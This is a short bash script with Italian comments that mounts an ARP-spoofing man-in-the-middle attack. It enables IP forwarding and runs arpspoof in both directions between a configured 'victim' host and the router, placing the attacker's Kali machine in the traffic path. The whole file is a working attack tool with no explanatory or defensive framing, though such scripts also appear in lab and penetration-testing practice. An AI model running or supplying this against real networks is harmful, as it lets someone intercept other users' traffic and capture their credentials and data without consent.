#!/bin/bash

# === CONFIG ===
IFACE="eth0"                  # interfaccia di rete da usare
ROUTER_IP="192.168.1.1"       # gateway
VICTIM_IP="192.168.1.50"      # vittima

echo "[*] Abilito IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

echo "[*] Avvio ARP spoof verso la vittima..."
sudo arpspoof -i "$IFACE" -t "$VICTIM_IP" "$ROUTER_IP" > /dev/null 2>&1 &

echo "[*] Avvio ARP spoof verso il router..."
sudo arpspoof -i "$IFACE" -t "$ROUTER_IP" "$VICTIM_IP" > /dev/null 2>&1 &

echo "[+] MITM ATTIVO"
echo "    Vittima ($VICTIM_IP) ⇆ Kali ⇆ Router ($ROUTER_IP)"
echo
echo "[!] Usa 'sudo ./stop_mitm.sh' per ripristinare tutto."
